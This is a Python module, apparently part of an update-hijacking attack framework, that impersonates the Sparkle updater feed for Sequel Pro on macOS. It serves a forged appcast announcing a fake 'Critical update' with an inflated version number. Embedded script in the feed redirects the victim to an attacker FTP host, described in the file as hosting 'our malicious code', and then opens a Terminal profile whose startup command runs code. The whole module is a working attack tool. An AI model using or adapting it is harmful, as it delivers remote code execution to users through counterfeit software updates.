from modules import ModuleBase


class Sparkle2(ModuleBase):
    name = 'Sparkle2'
    version = '1.0'
    appver = 'All'
    author = ['Matias Ariel Re Medina <mre[at]infobytesec[dot]com>']
    description = """Sparkle """,
    vh = '.*' #(sequelpro.com)'  # |adiumx.cachefly.net|download.panic.com|iterm2.com|github.com,
    useragent = True
    agent_filename = './agent/osx/update.dmg'
    options = {
        'appname': {
            'val': 'Sequel Pro',
            'desc': 'Application name.'
        },
        'applink': {
            'val': 'http://www.sequelpro.com',
            'desc': 'Application link.'
        },
        'appurl': {
            'val': 'https://github.com/sequelpro/sequelpro/releases/download/release-1.1/sequel-pro-1.1.dmg',
            'desc': 'Application url.'
        },
        'pubdate': {
            'val': 'Wed, 08 Jun 2019 19:20:11 +0000',
            'desc': 'Release date.'
        },
        'sversion': {
            'val': '9.99',
            'desc': 'App version.'
        },
        'version': {
            'val': '9999',
            'desc': 'App version.'
        },
        'ftp': {
            'val': 'ftp://anonymous:nopass@our-fake-server.com/',
            'desc': 'FTP server (our-fake-server.com) to host our malicious code.'
        },
        'termfile': {
            'val': 'file:///Volumes/our-fake-server.com/UPGRADE.terminal',
            'desc': 'UPGRADE.terminal file is an exported setting profile from the Terminal app (Terminal -> Preferences -> Profiles). Inside the "Shell" tab of selected profile, there is a possibility to add a startup command to execute immediately after loading a profile.'
        },
        'dsasig': {
            'val': 'dsasig MCwCFAyXhQMU7BR1tqa8KFuXnGAooA4ZAhQtJoStAhvbfmvsaejqnWSKWZUuY==',
            'desc': 'DSA Signature.'
        },
    }
    requests = [{
            'path': '.*', #match Sparkle header,
            'useragent': 'Sparkle',
            'agent': '',
            'type': 'string',
            'method': '',
            'bin': '',
            'string' : """<?xml version="1.0" encoding="utf-8"?>
<rss xmlns:atom="http://www.w3.org/2005/Atom"
xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle" version="2.0">
  <channel>
    <title><%APPNAME%> </title>
    <link><%APPLINK%></link>
    <description>Appcast for Sequel Pro</description>
    <language>en</language>
    <item>
      <title><%APPNAME%> <%VERSION%> (9 major bugs fixed; 6 new features)</title>
      <description><![CDATA[
      <h1 style="color: red;">Critical update available.</h1>
      <script type="text/javascript">
        window.location = \'<%FTP%>\';
        window.setTimeout(function() {
          window.location = \'<%TERMFILE%>\';
        }, 1000);
      </script>
      ]]></description>
      <pubDate><%PUBDATE%></pubDate>
      <enclosure
      url="<%APPURL%>"
      length="<%AGENTSIZE%>"
      type="application/octet-stream"
      sparkle:dsaSignature="<%DSASIG%>"
      sparkle:version="<%VERSION%>" sparkle:shortVersionString="<%SVERSION%>" />
    </item>
  </channel>
</rss>""",
            'parse': 1,
            'file': '',
        }
    ]
